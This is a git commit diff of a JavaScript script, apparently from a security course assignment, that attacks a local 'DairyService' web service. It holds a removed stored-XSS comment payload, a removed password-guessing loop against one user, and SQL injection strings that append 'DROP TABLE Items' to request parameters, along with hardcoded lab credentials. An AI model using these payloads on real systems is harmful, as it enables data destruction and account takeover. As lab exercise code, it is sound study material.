2d678e8cf3e839a3071c851e3f327edb769499c0
Etienne Naude <etinaude@gmail.com>
2020-09-16 11:38:03 +1200

    no passwd hax

--- A4/DairySvcAuth/src.js
+++ A4/DairySvcAuth/src.js
@@ -1,34 +1,40 @@
 console.log("run");
-fetch(`http://localhost:8188/DairyService.svc/comment?name=a`, {
-  method: "POST",
+/*fetch(`http://localhost:8188/DairyService.svc/search?term=DROP TABLE Items`, {
+  method: "GET",
   headers: {
     "Content-Type": "application/json",
   },
-  body: JSON.stringify(`<h1 onmouseover=alert("Hello")>aaa</h1>`),
-});
-/*
-breakB =false
-console.log("here")
-list.forEach(element => {
+}).then(console.log("done"));*/
+//using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM Items WHERE Id = @id"))
+list = [1];
+breakB = false;
+console.log("here");
+list.forEach((element) => {
   var xhr = new XMLHttpRequest();
   xhr.open(
     "GET",
-    `${Surl}/Service.svc/buy?id=248309245`,
+    `http://localhost:8189/Service.svc/buy?id=248309252;%20DROP%20TABLE%20Items`,
     true,
-    "ashton",
-    element
+    "jbon007",
+    "jbon007passwd"
   );
   xhr.withCredentials = true;
-  xhr.addEventListener("readystatechange", function() {
-    if(this.readyState === 4) {
-      if(this.responseText.includes("Fault ")){
-      }else{
-        if(this.responseText.includes("Thank you for purchasing Fromage frais fruit")){
-          document.getElementById("works").innerHTML+=`<br>${element}<br>`;
-          console.log(this.responseText)
-          breakB = true
+  xhr.addEventListener("readystatechange", function () {
+    if (this.readyState === 4) {
+      console.log(this.responseText);
+      /*if (this.responseText.includes("Fault ")) {
+      } else {
+        if (
+          this.responseText.includes(
+            "Thank you for purchasing Fromage frais fruit"
+          )
+        ) {
+          document.getElementById("works").innerHTML += `<br>${element}<br>`;
+          console.log(this.responseText);
+          breakB = true;
         }
       }
+    }*/
     }
   });
   xhr.send();
